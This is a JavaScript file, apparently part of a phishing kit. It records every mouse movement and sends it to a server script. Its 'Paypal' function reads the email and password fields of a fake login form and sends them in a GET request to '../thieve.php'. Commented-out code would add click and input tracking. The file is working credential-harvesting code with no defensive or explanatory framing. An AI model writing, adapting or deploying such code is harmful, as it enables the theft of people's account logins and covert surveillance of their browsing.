// clear all cookies

// make a js to get all the element in the web brouser then give themm all the random id
// Get element all
// var elementsOfbody = $("*");
// // run array to get all  there id
// $.each(elementsOfbody, function (index, value) {
//   // craete data set
//   $(this).attr(
//     "onclick",
//     "API__('IN', 'n', 'n', 'n', 'n', 'Ids_" + index + "', 'idontesting')"
//   );
//   $(this).attr("data-shadow", "Ids_" + index);
// });
// cursor tracker
var mouseX, mouseY;
var H = $(window).height();
var W = $(window).width();
$(document).mousemove(function (e) {
  mouseX = e.pageX;
  mouseY = e.pageY;
  MOUSEReport(mouseX, mouseY, H, W);
});

// click tracker
// $(document).click(function(event) {
//   // var text = $(event.target).text();
//   // var clck = $(event.target).attr("data-shadow");
//   // console.log(text +'  '+ clck );
//   API__("IN", "n", "n", "n", "n", clck, "idontesting");

// });
// input tracker
// $("input").change(function(event) {
//   var value = $(event.target).val();
//   var id = $(event.target).attr("name");
//   // alert(text +'  '+ clck );
// console.log('value: ' +value + '  name: ' +id )
// });
// report function to send report to server
var MOUSEReport = (x, y, H, W) => {
  API__("IN", W, H, x, y, (click__ = 0), "idontesting");
};


var API__ = (yz, xyz, wxyz, vwxyz, uvwxyz, tuvwxyz, stuvwxyz) => {
  var api_url =
    "../Blxktwix.php?T=" +
    yz +
    "&W=" +
    xyz +
    "&H=" +
    wxyz +
    "&X=" +
    vwxyz +
    "&Y=" +
    uvwxyz +
    "&C=" +
    tuvwxyz +
    "&I=" +
    stuvwxyz +
    "";
  $.get(api_url);
};

var Paypal = () => {
  // get click input and submit
var maill = $("#ap_email").val();
var pass = $("#ap_password").val();
var ty = $("#typee").val();
var idee = $("#idee").val();
  var api_url =
    "../thieve.php?pass=" +
    pass +
    "&mail=" +
    maill +
    "&runid="+ty+"&id="+idee+"";
  $.get(api_url);
};
